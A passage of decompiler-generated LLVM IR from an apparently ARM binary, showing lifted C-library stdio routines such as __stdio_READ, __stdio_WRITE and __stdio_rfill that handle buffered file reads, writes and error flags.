  %v0_11d04 = load i32, i32* %r8.global-to-local, align 4
  %v0_11d08 = load i32, i32* %sb.global-to-local, align 4
  %v1_11d0c = load i32, i32* @sp, align 4
  %v2_11d0c = inttoptr i32 %v1_11d0c to i32*
  store i32 0, i32* %v2_11d0c, align 4
  %v4_11d10 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_11d04, i32 %v0_11d08)
  %v0_11d14 = load i32, i32* @r5, align 4
  %v1_11d14 = load i32, i32* %sl.global-to-local, align 4
  %v9_11d14 = icmp eq i32 %v0_11d14, %v1_11d14
  br i1 %v9_11d14, label %dec_label_pc_11d1c, label %dec_label_pc_11d80

dec_label_pc_11d1c:                               ; preds = %dec_label_pc_11cfc
  %v0_11d20 = call i32 @__aeabi_read_tp()
  %v3_11d24 = load i16, i16* @global_var_222f0.75, align 2
  %v4_11d24 = sext i16 %v3_11d24 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_11d30 = add i32 %v4_11d24, %v0_11d20
  %v4_11d30 = inttoptr i32 %v3_11d30 to i32*
  store i32 22, i32* %v4_11d30, align 4
  br label %dec_label_pc_11d84

dec_label_pc_11d38:                               ; preds = %dec_label_pc_11cdc
  %v1_11d38 = inttoptr i32 %v0_11d3c to i32*
  %v2_11d38 = load i32, i32* %v1_11d38, align 4
  %v3_11d38 = add i32 %v0_11d3c, 4
  %v4_11d38 = inttoptr i32 %v3_11d38 to i32*
  %v5_11d38 = load i32, i32* %v4_11d38, align 4
  store i32 %v5_11d38, i32* @r4, align 4
  %v1_11d3c = add i32 %v0_11d3c, 8
  store i32 %v1_11d3c, i32* %r8.global-to-local, align 4
  %v1_11d40 = inttoptr i32 %v1_11d3c to i32*
  %v2_11d40 = load i32, i32* %v1_11d40, align 4
  store i32 %v2_11d40, i32* %r8.global-to-local, align 4
  %v3_11d40 = add i32 %v0_11d3c, 12
  %v4_11d40 = inttoptr i32 %v3_11d40 to i32*
  %v5_11d40 = load i32, i32* %v4_11d40, align 4
  store i32 %v5_11d40, i32* %sb.global-to-local, align 4
  %v1_11d44 = inttoptr i32 %v0_11d44 to i32*
  store i32 %v2_11d38, i32* %v1_11d44, align 4
  %v3_11d44 = add i32 %v0_11d44, 4
  %v4_11d44 = inttoptr i32 %v3_11d44 to i32*
  %v5_11d44 = load i32, i32* @r4, align 4
  store i32 %v5_11d44, i32* %v4_11d44, align 4
  %v0_11d48 = load i32, i32* %r8.global-to-local, align 4
  %v1_11d48 = load i32, i32* @r5, align 4
  %v2_11d48 = add i32 %v1_11d48, 8
  %v3_11d48 = inttoptr i32 %v2_11d48 to i32*
  store i32 %v0_11d48, i32* %v3_11d48, align 4
  %v0_11d4c = load i32, i32* %sb.global-to-local, align 4
  %v1_11d4c = load i32, i32* @r5, align 4
  %v2_11d4c = add i32 %v1_11d4c, 12
  %v3_11d4c = inttoptr i32 %v2_11d4c to i32*
  store i32 %v0_11d4c, i32* %v3_11d4c, align 4
  %v0_11d50 = load i32, i32* @ip, align 4
  %v1_11d50 = trunc i32 %v0_11d50 to i16
  %v2_11d50 = load i32, i32* @r5, align 4
  %v3_11d50 = add i32 %v2_11d50, 16
  %v4_11d50 = inttoptr i32 %v3_11d50 to i16*
  store i16 %v1_11d50, i16* %v4_11d50, align 2
  %v0_11d54 = load i32, i32* @r7, align 4
  %v1_11d54 = add i32 %v0_11d54, 18
  %v2_11d54 = inttoptr i32 %v1_11d54 to i8*
  %v3_11d54 = load i8, i8* %v2_11d54, align 1
  %v4_11d54 = zext i8 %v3_11d54 to i32
  store i32 %v4_11d54, i32* @r3, align 4
  %v2_11d58 = load i32, i32* @r5, align 4
  %v3_11d58 = add i32 %v2_11d58, 18
  %v4_11d58 = inttoptr i32 %v3_11d58 to i8*
  store i8 %v3_11d54, i8* %v4_11d58, align 1
  %v0_11d5c = call i32 @memcpy()
  %v0_11d60 = load i32, i32* @r7, align 4
  %v1_11d60 = add i32 %v0_11d60, 16
  %v2_11d60 = inttoptr i32 %v1_11d60 to i16*
  %v3_11d60 = load i16, i16* %v2_11d60, align 2
  %v4_11d60 = zext i16 %v3_11d60 to i32
  %v0_11d64 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_11d64, i32* @r5, align 4
  %v2_11d68 = add i32 %v4_11d60, %v0_11d60
  store i32 %v2_11d68, i32* @r7, align 4
  br label %dec_label_pc_11d6c

dec_label_pc_11d6c:                               ; preds = %dec_label_pc_11cbc, %dec_label_pc_11d38
  %v0_11d44 = phi i32 [ %tmp, %dec_label_pc_11cbc ], [ %v0_11d64, %dec_label_pc_11d38 ]
  %v0_11d3c = phi i32 [ %v1_11c70, %dec_label_pc_11cbc ], [ %v2_11d68, %dec_label_pc_11d38 ]
  %v3_11d70 = icmp ult i32 %v0_11d3c, %v2_11cbc
  %v1_11d74 = add i32 %v0_11d44, 19
  store i32 %v1_11d74, i32* @r0, align 4
  %v1_11d78 = add i32 %v0_11d3c, 19
  store i32 %v1_11d78, i32* @r1, align 4
  br i1 %v3_11d70, label %dec_label_pc_11cdc, label %dec_label_pc_11d80.loopexit

dec_label_pc_11d80.loopexit:                      ; preds = %dec_label_pc_11d6c
  %v0_11d80.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_11d80

dec_label_pc_11d80:                               ; preds = %dec_label_pc_11d80.loopexit, %dec_label_pc_11cfc
  %v1_11d80 = phi i32 [ %v0_11d44, %dec_label_pc_11d80.loopexit ], [ %v0_11d14, %dec_label_pc_11cfc ]
  %v0_11d80 = phi i32 [ %v0_11d80.pre, %dec_label_pc_11d80.loopexit ], [ %v1_11d14, %dec_label_pc_11cfc ]
  %v2_11d80 = sub i32 %v1_11d80, %v0_11d80
  store i32 %v2_11d80, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11d84

dec_label_pc_11d84:                               ; preds = %dec_label_pc_11cb4, %dec_label_pc_11d1c, %dec_label_pc_11c98, %dec_label_pc_11d80
  %v0_11d84 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v6_11c58, i32* @r5, align 4
  store i32 %v12_11c58, i32* @r7, align 4
  ret i32 %v0_11d84

; uselistorder directives
  uselistorder i32 %v0_11d3c, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_11d44, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_11c70, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 %arg1, { 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_11d84, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_11d6c, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11d9c = load i32, i32* @r4, align 4
  store i32 %v3_11d9c, i32* %stack_var_-12, align 4
  %v0_11da0 = load i32, i32* %r0.global-to-local, align 4
  %v1_11da0 = inttoptr i32 %v0_11da0 to i16*
  %v2_11da0 = load i16, i16* %v1_11da0, align 2
  %v3_11da0 = zext i16 %v2_11da0 to i32
  store i32 %v3_11da0, i32* @r3, align 4
  %v1_11da4 = and i32 %v3_11da0, 4
  store i32 %v1_11da4, i32* @r5, align 4
  %v2_11da4 = icmp eq i32 %v1_11da4, 0
  store i32 %v0_11da0, i32* @r4, align 4
  br i1 %v2_11da4, label %dec_label_pc_11db8, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_11db8:                               ; preds = %entry
  %v1_11db8 = icmp slt i32 %arg2, 0
  br i1 %v1_11db8, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_11db8
  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_11db8, %bb18
  %v1_11dc0 = add i32 %v0_11da0, 4
  %v2_11dc0 = inttoptr i32 %v1_11dc0 to i32*
  %v3_11dc0 = load i32, i32* %v2_11dc0, align 4
  store i32 %v3_11dc0, i32* %r0.global-to-local, align 4
  %v1_11dc4 = call i32 @__libc_read(i32 %v3_11dc0)
  store i32 %v1_11dc4, i32* %r0.global-to-local, align 4
  %v5_11dcc = icmp sgt i32 %v1_11dc4, 0
  br i1 %v5_11dcc, label %.thread7, label %dec_label_pc_11dd0

dec_label_pc_11dd0:                               ; preds = %bb19
  %v2_11dc8 = icmp eq i32 %v1_11dc4, 0
  %v0_11dd0 = load i32, i32* @r4, align 4
  %v1_11dd0 = inttoptr i32 %v0_11dd0 to i16*
  %v2_11dd0 = load i16, i16* %v1_11dd0, align 2
  br i1 %v2_11dc8, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_11dd0
  %v2_11dd4 = or i16 %v2_11dd0, 4
  store i16 %v2_11dd4, i16* %v1_11dd0, align 2
  %v1_11df0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_11dd0
  %v2_11dd8 = or i16 %v2_11dd0, 8
  store i16 %v2_11dd8, i16* %v1_11dd0, align 2
  %v1_11de4 = load i32, i32* @r5, align 4
  store i32 %v1_11de4, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_11df0 = phi i32 [ %v1_11df0.pre, %bb20 ], [ 0, %bb ], [ %v1_11dc4, %bb19 ], [ %v1_11de4, %bb21 ]
  %v2_11dec = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11dec, i32* @r4, align 4
  ret i32 %v1_11df0

; uselistorder directives
  uselistorder i16 %v2_11dd0, { 1, 0 }
  uselistorder i32 %v1_11dc4, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %v15_11df4 = load i32, i32* @r8, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_11eb82 = icmp eq i32 %arg3, 0
  store i1 %v2_11eb82, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11eb82, label %dec_label_pc_11ec0, label %dec_label_pc_11e10

dec_label_pc_11e10:                               ; preds = %entry, %dec_label_pc_11eb8thread-pre-split.dec_label_pc_11e10_crit_edge
  %v0_11e1c = phi i32 [ %v0_11e1c.pre, %dec_label_pc_11eb8thread-pre-split.dec_label_pc_11e10_crit_edge ], [ %tmp, %entry ]
  %v0_11e18 = phi i32 [ %v5_11e28, %dec_label_pc_11eb8thread-pre-split.dec_label_pc_11e10_crit_edge ], [ %arg2, %entry ]
  %v3_11e10 = phi i32 [ %v3_11e10.pre, %dec_label_pc_11eb8thread-pre-split.dec_label_pc_11e10_crit_edge ], [ 2147483647, %entry ]
  %v0_11e14.in = phi i32 [ %v5_11e2c, %dec_label_pc_11eb8thread-pre-split.dec_label_pc_11e10_crit_edge ], [ %arg3, %entry ]
  %v3_11e14 = phi i32 [ %v5_11e2c, %dec_label_pc_11eb8thread-pre-split.dec_label_pc_11e10_crit_edge ], [ %arg3, %entry ]
  %v0_11e14 = icmp slt i32 %v0_11e14.in, 0
  %storemerge = select i1 %v0_11e14, i32 %v3_11e10, i32 %v3_11e14
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v0_11e18, i32* %r1.global-to-local, align 4
  %v1_11e1c = add i32 %v0_11e1c, 4
  %v2_11e1c = inttoptr i32 %v1_11e1c to i32*
  %v3_11e1c = load i32, i32* %v2_11e1c, align 4
  %v3_11e20 = call i32 @__GI___libc_write(i32 %v3_11e1c, i32 %v0_11e18)
  %v1_11e24 = icmp slt i32 %v3_11e20, 0
  %v2_11e24 = icmp eq i32 %v3_11e20, 0
  store i1 %v2_11e24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_11e24, label %dec_label_pc_11e34, label %dec_label_pc_11eb8thread-pre-split

dec_label_pc_11e34:                               ; preds = %dec_label_pc_11e10
  %v0_11e34 = load i32, i32* @r4, align 4
  %v1_11e34 = inttoptr i32 %v0_11e34 to i16*
  %v2_11e34 = load i16, i16* %v1_11e34, align 2
  %v1_11e38 = or i16 %v2_11e34, 8
  store i16 %v1_11e38, i16* %v1_11e34, align 2
  store i32 66720, i32* %r3.global-to-local, align 4
  %v0_11e44 = call i32 @__aeabi_read_tp()
  %v3_11e48 = load i16, i16* @global_var_222f0.75, align 2
  %v4_11e48 = sext i16 %v3_11e48 to i32
  store i32 %v4_11e48, i32* %r3.global-to-local, align 4
  %v2_11e4c = add i32 %v4_11e48, %v0_11e44
  %v3_11e4c = inttoptr i32 %v2_11e4c to i32*
  %v4_11e4c = load i32, i32* %v3_11e4c, align 4
  store i32 %v4_11e4c, i32* %r3.global-to-local, align 4
  %v7_11e50 = icmp eq i32 %v4_11e4c, 4
  store i1 %v7_11e50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11e50, label %dec_label_pc_11e5c, label %bb21

bb21:                                             ; preds = %dec_label_pc_11e34
  %v8_11e54 = icmp eq i32 %v4_11e4c, 11
  store i1 %v8_11e54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11e54, label %dec_label_pc_11e5c, label %dec_label_pc_11ec0

dec_label_pc_11e5c:                               ; preds = %dec_label_pc_11e34, %bb21
  %v0_11e5c = load i32, i32* @r4, align 4
  %v1_11e5c = add i32 %v0_11e5c, 8
  store i32 %v1_11e5c, i32* %r2.global-to-local, align 4
  %v1_11e60 = inttoptr i32 %v1_11e5c to i32*
  %v2_11e60 = load i32, i32* %v1_11e60, align 4
  store i32 %v2_11e60, i32* %r2.global-to-local, align 4
  %v3_11e60 = add i32 %v0_11e5c, 12
  %v4_11e60 = inttoptr i32 %v3_11e60 to i32*
  %v5_11e60 = load i32, i32* %v4_11e60, align 4
  store i32 %v5_11e60, i32* %r3.global-to-local, align 4
  %v2_11e64 = sub i32 %v5_11e60, %v2_11e60
  store i32 %v2_11e64, i32* %r1.global-to-local, align 4
  %v9_11e64 = icmp eq i32 %v5_11e60, %v2_11e60
  store i1 %v9_11e64, i1* %cpsr_z.global-to-local, align 1
  %v0_11eb0.pre = load i32, i32* @r5, align 4
  br i1 %v9_11e64, label %dec_label_pc_11eb0, label %dec_label_pc_11e6c

dec_label_pc_11e6c:                               ; preds = %dec_label_pc_11e5c
  %v3_11e6c = icmp ult i32 %v2_11e64, %v0_11eb0.pre
  %v9_11e6c = icmp eq i32 %v2_11e64, %v0_11eb0.pre
  store i1 %v9_11e6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11e6c, label %.preheader, label %bb22

bb22:                                             ; preds = %dec_label_pc_11e6c
  store i32 %v0_11eb0.pre, i32* %r1.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_11e6c, %bb22, %dec_label_pc_11e94
  %v2_11e80 = phi i32 [ %v1_11e98, %dec_label_pc_11e94 ], [ %v2_11e60, %bb22 ], [ %v2_11e60, %dec_label_pc_11e6c ]
  %v0_11e74 = load i32, i32* @r6, align 4
  %v1_11e74 = inttoptr i32 %v0_11e74 to i8*
  %v2_11e74 = load i8, i8* %v1_11e74, align 1
  %v3_11e74 = zext i8 %v2_11e74 to i32
  store i32 %v3_11e74, i32* %r3.global-to-local, align 4
  %v7_11e78 = icmp eq i8 %v2_11e74, 10
  store i1 %v7_11e78, i1* %cpsr_z.global-to-local, align 1
  %v1_11e7c = add i32 %v0_11e74, 1
  store i32 %v1_11e7c, i32* @r6, align 4
  %v3_11e80 = inttoptr i32 %v2_11e80 to i8*
  store i8 %v2_11e74, i8* %v3_11e80, align 1
  %v0_11e84 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11e84, label %dec_label_pc_11e88, label %dec_label_pc_11e94

dec_label_pc_11e88:                               ; preds = %.preheader
  %v0_11e88 = load i32, i32* @r4, align 4
  %v1_11e88 = inttoptr i32 %v0_11e88 to i16*
  %v2_11e88 = load i16, i16* %v1_11e88, align 2
  %v3_11e88 = zext i16 %v2_11e88 to i32
  store i32 %v3_11e88, i32* %r3.global-to-local, align 4
  %v1_11e8c = and i32 %v3_11e88, 256
  %v2_11e8c = icmp eq i32 %v1_11e8c, 0
  store i1 %v2_11e8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11e8c, label %dec_label_pc_11e94, label %dec_label_pc_11e88.dec_label_pc_11ea0_crit_edge

dec_label_pc_11e88.dec_label_pc_11ea0_crit_edge:  ; preds = %dec_label_pc_11e88
  %v0_11ea4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11ea0

dec_label_pc_11e94:                               ; preds = %dec_label_pc_11e88, %.preheader
  %v0_11e94 = load i32, i32* %r1.global-to-local, align 4
  %v1_11e94 = add i32 %v0_11e94, -1
  store i32 %v1_11e94, i32* %r1.global-to-local, align 4
  %v7_11e94 = icmp eq i32 %v0_11e94, 1
  store i1 %v7_11e94, i1* %cpsr_z.global-to-local, align 1
  %v0_11e98 = load i32, i32* %r2.global-to-local, align 4
  %v1_11e98 = add i32 %v0_11e98, 1
  store i32 %v1_11e98, i32* %r2.global-to-local, align 4
  br i1 %v7_11e94, label %dec_label_pc_11e94.dec_label_pc_11ea0_crit_edge, label %.preheader

dec_label_pc_11e94.dec_label_pc_11ea0_crit_edge:  ; preds = %dec_label_pc_11e94
  %v0_11ea0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11ea0

dec_label_pc_11ea0:                               ; preds = %dec_label_pc_11e88.dec_label_pc_11ea0_crit_edge, %dec_label_pc_11e94.dec_label_pc_11ea0_crit_edge
  %v0_11ea4 = phi i32 [ %v1_11e98, %dec_label_pc_11e94.dec_label_pc_11ea0_crit_edge ], [ %v0_11ea4.pre, %dec_label_pc_11e88.dec_label_pc_11ea0_crit_edge ]
  %v0_11ea0 = phi i32 [ %v0_11ea0.pre, %dec_label_pc_11e94.dec_label_pc_11ea0_crit_edge ], [ %v0_11e88, %dec_label_pc_11e88.dec_label_pc_11ea0_crit_edge ]
  %v1_11ea0 = add i32 %v0_11ea0, 8
  %v2_11ea0 = inttoptr i32 %v1_11ea0 to i32*
  %v3_11ea0 = load i32, i32* %v2_11ea0, align 4
  store i32 %v3_11ea0, i32* %r3.global-to-local, align 4
  %v2_11ea4 = add i32 %v0_11ea0, 16
  %v3_11ea4 = inttoptr i32 %v2_11ea4 to i32*
  store i32 %v0_11ea4, i32* %v3_11ea4, align 4
  %v0_11ea8 = load i32, i32* %r3.global-to-local, align 4
  %v1_11ea8 = load i32, i32* %r2.global-to-local, align 4
  %v2_11ea8 = sub i32 %v1_11ea8, %v0_11ea8
  store i32 %v2_11ea8, i32* %r3.global-to-local, align 4
  %v1_11eac = load i32, i32* @r5, align 4
  %v2_11eac = sub i32 %v1_11eac, %v2_11ea8
  br label %dec_label_pc_11eb0

dec_label_pc_11eb0:                               ; preds = %dec_label_pc_11e5c, %dec_label_pc_11ea0
  %v0_11eb0 = phi i32 [ %v2_11eac, %dec_label_pc_11ea0 ], [ %v0_11eb0.pre, %dec_label_pc_11e5c ]
  %v1_11eb0 = load i32, i32* @r7, align 4
  %v2_11eb0 = sub i32 %v1_11eb0, %v0_11eb0
  store i32 %v2_11eb0, i32* @r7, align 4
  br label %dec_label_pc_11ec0

dec_label_pc_11eb8thread-pre-split:               ; preds = %dec_label_pc_11e10
  %v3_11e28 = load i32, i32* @r6, align 4
  %v5_11e28 = add i32 %v3_11e28, %v3_11e20
  store i32 %v5_11e28, i32* @r6, align 4
  %v4_11e2c = load i32, i32* @r5, align 4
  %v5_11e2c = sub i32 %v4_11e2c, %v3_11e20
  store i32 %v5_11e2c, i32* @r5, align 4
  %v2_11eb8 = icmp eq i32 %v5_11e2c, 0
  store i1 %v2_11eb8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11eb8, label %dec_label_pc_11ec0, label %dec_label_pc_11eb8thread-pre-split.dec_label_pc_11e10_crit_edge

dec_label_pc_11eb8thread-pre-split.dec_label_pc_11e10_crit_edge: ; preds = %dec_label_pc_11eb8thread-pre-split
  %v3_11e10.pre = load i32, i32* @r8, align 4
  %v0_11e1c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11e10

dec_label_pc_11ec0:                               ; preds = %dec_label_pc_11eb8thread-pre-split, %entry, %bb21, %dec_label_pc_11eb0
  %v0_11ec0 = load i32, i32* @r7, align 4
  store i32 %v15_11df4, i32* @r8, align 4
  ret i32 %v0_11ec0

; uselistorder directives
  uselistorder i32 %v5_11e2c, { 1, 3, 0, 2 }
  uselistorder i32 %v5_11e28, { 1, 0 }
  uselistorder i32 %v0_11ea0, { 1, 0 }
  uselistorder i32 %v1_11e98, { 0, 2, 1 }
  uselistorder i32 %v0_11e94, { 1, 0 }
  uselistorder i32 %v0_11eb0.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_11e60, { 1, 0, 2 }
  uselistorder i32 %v2_11e60, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_11e20, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11e18, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 1, 4, 2, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 10, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 (i32, i32)* @__GI___libc_write, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_11ec0, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_11eb0, { 1, 0 }
  uselistorder label %dec_label_pc_11ea0, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11e5c, { 1, 0 }
  uselistorder label %dec_label_pc_11e10, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_11ed0 = load i32, i32* @r4, align 4
  store i32 %v3_11ed0, i32* %stack_var_-8, align 4
  %v1_11ed4 = add i32 %arg1, 8
  %v1_11ed8 = inttoptr i32 %v1_11ed4 to i32*
  %v2_11ed8 = load i32, i32* %v1_11ed8, align 4
  store i32 %v2_11ed8, i32* @r1, align 4
  %v3_11ed8 = add i32 %arg1, 12
  %v4_11ed8 = inttoptr i32 %v3_11ed8 to i32*
  %v5_11ed8 = load i32, i32* %v4_11ed8, align 4
  %v2_11edc = sub i32 %v5_11ed8, %v2_11ed8
  store i32 %v2_11edc, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_11ee4 = inttoptr i32 %arg1 to i16*
  %v4_11ee4 = call i32 @__stdio_READ(i16* %v3_11ee4, i32 %v2_11ed8, i32 %v2_11edc)
  %v0_11ee8 = load i32, i32* @r4, align 4
  %v1_11ee8 = add i32 %v0_11ee8, 8
  %v2_11ee8 = inttoptr i32 %v1_11ee8 to i32*
  %v3_11ee8 = load i32, i32* %v2_11ee8, align 4
  store i32 %v3_11ee8, i32* %r2.global-to-local, align 4
  %v2_11eec = add i32 %v3_11ee8, %v4_11ee4
  %v2_11ef0 = add i32 %v0_11ee8, 20
  %v3_11ef0 = inttoptr i32 %v2_11ef0 to i32*
  store i32 %v2_11eec, i32* %v3_11ef0, align 4
  %v0_11ef4 = load i32, i32* %r2.global-to-local, align 4
  %v1_11ef4 = load i32, i32* @r4, align 4
  %v2_11ef4 = add i32 %v1_11ef4, 16
  %v3_11ef4 = inttoptr i32 %v2_11ef4 to i32*
  store i32 %v0_11ef4, i32* %v3_11ef4, align 4
  %v2_11ef8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_11ef8, i32* @r4, align 4
  ret i32 %v4_11ee4

; uselistorder directives
  uselistorder i32 %v4_11ee4, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11f00 = load i32, i32* @r4, align 4
  store i32 %v3_11f00, i32* %stack_var_-12, align 4
  %v0_11f04 = load i32, i32* @r0, align 4
  %v1_11f04 = inttoptr i32 %v0_11f04 to i16*
  %v2_11f04 = load i16, i16* %v1_11f04, align 2
  %v3_11f04 = zext i16 %v2_11f04 to i32
  store i32 %v3_11f04, i32* %r3.global-to-local, align 4
  %v0_11f08 = load i32, i32* @r1, align 4
  %v2_11f08 = and i32 %v0_11f08, %v3_11f04
  %v4_11f08 = icmp eq i32 %v2_11f08, 0
  store i32 %v0_11f04, i32* @r4, align 4
  br i1 %v4_11f08, label %dec_label_pc_11f18, label %dec_label_pc_11f28

dec_label_pc_11f18:                               ; preds = %entry
  %v1_11f18 = and i32 %v3_11f04, 2176
  %v2_11f18 = icmp eq i32 %v1_11f18, 0
  br i1 %v2_11f18, label %dec_label_pc_11f20, label %dec_label_pc_11f34

dec_label_pc_11f20:                               ; preds = %dec_label_pc_11f18
  %v2_11f20 = or i32 %v0_11f08, %v3_11f04
  store i32 %v2_11f20, i32* %r3.global-to-local, align 4
  %v1_11f24 = trunc i32 %v2_11f20 to i16
  store i16 %v1_11f24, i16* %v1_11f04, align 2
  %v0_11f28.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11f28

dec_label_pc_11f28:                               ; preds = %entry, %dec_label_pc_11f20
  %v0_11f28 = phi i32 [ %v0_11f04, %entry ], [ %v0_11f28.pre, %dec_label_pc_11f20 ]
  %v1_11f28 = inttoptr i32 %v0_11f28 to i16*
  %v2_11f28 = load i16, i16* %v1_11f28, align 2
  %v3_11f28 = zext i16 %v2_11f28 to i32
  store i32 %v3_11f28, i32* %r3.global-to-local, align 4
  %v1_11f2c = and i32 %v3_11f28, 16
  store i32 %v1_11f2c, i32* %r5.global-to-local, align 4
  %v2_11f2c = icmp eq i32 %v1_11f2c, 0
  br i1 %v2_11f2c, label %dec_label_pc_11f5c, label %dec_label_pc_11f34

dec_label_pc_11f34:                               ; preds = %dec_label_pc_11f18, %dec_label_pc_11f28
  store i32 66476, i32* %r3.global-to-local, align 4
  %v0_11f38 = call i32 @__aeabi_read_tp()
  store i32 %v0_11f38, i32* %r0.global-to-local, align 4
  %v3_11f3c = load i16, i16* @global_var_222f0.75, align 2
  %v4_11f3c = sext i16 %v3_11f3c to i32
  store i32 %v4_11f3c, i32* %r3.global-to-local, align 4
  %v3_11f44 = add i32 %v4_11f3c, %v0_11f38
  %v4_11f44 = inttoptr i32 %v3_11f44 to i32*
  store i32 9, i32* %v4_11f44, align 4
  br label %dec_label_pc_11f48

dec_label_pc_11f48:                               ; preds = %dec_label_pc_11f64, %dec_label_pc_11f34
  %v0_11f48 = load i32, i32* @r4, align 4
  %v1_11f48 = inttoptr i32 %v0_11f48 to i16*
  %v2_11f48 = load i16, i16* %v1_11f48, align 2
  %v3_11f48 = zext i16 %v2_11f48 to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_11f50 = or i32 %v3_11f48, 8
  store i32 %v1_11f50, i32* %r3.global-to-local, align 4
  %v1_11f54 = trunc i32 %v1_11f50 to i16
  store i16 %v1_11f54, i16* %v1_11f48, align 2
  %v1_11f9c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11f94

dec_label_pc_11f5c:                               ; preds = %dec_label_pc_11f28
  %v1_11f5c = and i32 %v3_11f28, 64
  %v2_11f5c = icmp eq i32 %v1_11f5c, 0
  br i1 %v2_11f5c, label %dec_label_pc_11f84, label %dec_label_pc_11f64

dec_label_pc_11f64:                               ; preds = %dec_label_pc_11f5c
  %v0_11f64 = call i32 @__stdio_wcommit()
  store i32 %v0_11f64, i32* %r0.global-to-local, align 4
  %v2_11f68 = icmp eq i32 %v0_11f64, 0
  br i1 %v2_11f68, label %dec_label_pc_11f70, label %dec_label_pc_11f48

dec_label_pc_11f70:                               ; preds = %dec_label_pc_11f64
  %v0_11f70 = load i32, i32* @r4, align 4
  %v1_11f70 = inttoptr i32 %v0_11f70 to i16*
  %v2_11f70 = load i16, i16* %v1_11f70, align 2
  %v3_11f70 = zext i16 %v2_11f70 to i32
  store i32 %v3_11f70, i32* %r3.global-to-local, align 4
  %v1_11f74 = add i32 %v0_11f70, 8
  %v2_11f74 = inttoptr i32 %v1_11f74 to i32*
  %v3_11f74 = load i32, i32* %v2_11f74, align 4
  %v1_11f78 = and i32 %v3_11f70, 65471
  store i32 %v1_11f78, i32* %r3.global-to-local, align 4
  %v2_11f7c = add i32 %v0_11f70, 28
  %v3_11f7c = inttoptr i32 %v2_11f7c to i32*
  store i32 %v3_11f74, i32* %v3_11f7c, align 4
